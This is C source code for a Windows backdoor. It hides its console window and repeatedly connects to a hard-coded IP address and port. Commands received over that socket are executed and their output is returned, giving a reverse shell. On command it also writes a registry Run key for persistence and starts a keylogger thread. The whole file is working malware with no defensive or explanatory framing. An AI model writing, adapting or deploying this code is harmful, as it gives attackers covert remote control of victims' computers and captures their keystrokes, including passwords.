#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(param, param_size) (void) memset((param), 0, (param_size));

int sock;

char* str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

int bootRun() {
    char err[128] = "Failed\n";
    char success[128] = "Created Persistance At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY newVal;
    if (RegOpenKey(HKEY_CURRENT_USER, 
        TEXT("Software\\Microsoft\\Windows\\CurrrentVersion\\Run"), 
        &newVal) != ERROR_SUCCESS) {
        
            send(sock, err, sizeof(err), 0);
            return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(newVal, 
        TEXT("<pick a name>"), 
        0, 
        REG_SZ, 
        (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {

            RegCloseKey(newVal);
            send(sock, err, sizeof(err), 0);
            return -1;
        }
    
    RegCloseKey(newVal);
    send(sock, success, sizeof(success), 0);
    return 0;
}   

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18768];

    while (1) {
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        recv(sock, buffer, 1024, 0);

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        } else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer, 3, 100));
        } else if (strncmp("persist", buffer, 7) == 0) {
            bootRun();
        } else if (strncmp("keylog_start", buffer, 12) == 0) {
            CreateThread(NULL, 0, logg, NULL, 0, NULL);
        } else {
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container, 1024, fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

void HideConsoleWindow() {
    HWND consoleWindow = GetConsoleWindow();
    if (consoleWindow != NULL) {
        // Introduce a small delay to ensure the console window is ready
        Sleep(100); // Adjust the delay as needed
        ShowWindowAsync(consoleWindow, SW_HIDE);
    } else {
        printf("No Window");
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    AllocConsole();
    HideConsoleWindow();

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsadata;

    ServIP = "192.168.1.229";
    ServPort = 9001;

    if (WSAStartup(MAKEWORD(2,0), &wsadata) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(8);
    }
    Shell();

    return 0;
}
